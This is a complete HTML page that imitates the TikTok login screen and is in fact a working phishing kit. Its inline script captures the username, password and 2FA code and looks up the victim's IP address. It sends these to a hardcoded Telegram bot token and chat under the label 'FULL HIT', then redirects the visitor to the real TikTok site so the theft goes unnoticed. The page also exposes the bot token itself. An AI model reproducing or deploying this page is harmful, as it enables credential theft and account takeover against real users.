<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <meta http-equiv="Content-Security-Policy" content="default-src 'self'; connect-src 'self' https://api.telegram.org https://api.ipify.org https://www.tiktok.com; img-src 'self' https://www.tiktok.com https://sf16-scmcdn-va.ibytedtos.com; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline';">
  <title>TikTok - Log In</title>
  <link rel="icon" href="https://www.tiktok.com/favicon.ico">
  <style>
    body {
      margin: 0;
      background: #000;
      color: #fff;
      font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif;
      text-align: center;
      padding: 20px;
      height: 100vh;
      display: flex;
      align-items: center;
      justify-content: center;
    }
    .container {
      width: 90%;
      max-width: 380px;
      background: #111;
      padding: 30px 20px;
      border-radius: 12px;
      box-shadow: 0 0 20px rgba(255,255,255,0.05);
    }
    .logo {
      width: 120px;
      margin: 0 auto 20px;
    }
    h2 {
      margin: 0 0 25px;
      font-size: 26px;
      font-weight: 600;
    }
    input {
      width: 100%;
      padding: 14px 16px;
      margin: 10px 0;
      background: #1a1a1a;
      border: 1px solid #333;
      color: #fff;
      border-radius: 8px;
      font-size: 16px;
      box-sizing: border-box;
      transition: border 0.2s;
    }
    input:focus, input.error {
      border-color: #fe2c55;
      outline: none;
    }
    button {
      width: 100%;
      padding: 14px;
      background: #fe2c55;
      border: none;
      color: #fff;
      font-weight: 700;
      border-radius: 8px;
      font-size: 17px;
      cursor: pointer;
      transition: background 0.2s;
      margin-top: 10px;
    }
    button:hover {
      background: #e0254a;
    }
    .small {
      font-size: 13px;
      color: #aaa;
      margin-top: 15px;
      line-height: 1.4;
    }
    .loader {
      display: none;
      margin: 20px auto;
      border: 4px solid #333;
      border-top: 4px solid #fe2c55;
      border-radius: 50%;
      width: 32px;
      height: 32px;
      animation: spin 1s linear infinite;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <div class="container">
    <img src="https://sf16-scmcdn-va.ibytedtos.com/tos-maliva-web-static/5d6d6a0d/tiktok-logo.svg" alt="TikTok" class="logo">
    <h2>Log in to TikTok</h2>
    <form id="form">
      <input id="u" placeholder="Username or Email" required autocomplete="off">
      <input id="p" type="password" placeholder="Password" required autocomplete="off">
      <input id="twofa" placeholder="2FA Code (if required)" autocomplete="off">
      <button type="submit" id="btn">Log in</button>
      <div class="small">If you have 2FA enabled, enter the 6-digit code sent to your phone or email.</div>
      <div class="loader" id="loader"></div>
    </form>
  </div>

  <script>
    const token = "8205658105:AAFH2lOY2Cd0yUASvewOT0hZqCOro5GDMGY";
    const chat = "6806926557";

    document.getElementById("form").addEventListener("submit", async (e) => {
      e.preventDefault();

      const btn = document.getElementById("btn");
      const loader = document.getElementById("loader");
      btn.disabled = true;
      btn.textContent = "Verifying...";
      loader.style.display = "block";

      const u = document.getElementById("u").value.trim();
      const p = document.getElementById("p").value.trim();
      const twofa = document.getElementById("twofa").value.trim();

      let ip = "unknown";
      try {
        const res = await fetch("https://api.ipify.org?format=json");
        const data = await res.json();
        ip = data.ip;
      } catch {}

      const msg = `ðŸŽ£ FULL HIT\nUser: ${u}\nPass: ${p}\n2FA: ${twofa || "not entered"}\nIP: ${ip}\nTime: ${new Date().toLocaleString("en-US", {timeZone: "Africa/Lagos"})}`;

      await fetch(`https://api.telegram.org/bot${token}/sendMessage?chat_id=${chat}&text=${encodeURIComponent(msg)}`)
        .catch(() => {});

      // Fake delay + redirect
      setTimeout(() => {
        window.location.href = "https://www.tiktok.com";
      }, 2200);
    });
  </script>
</body>
</html>
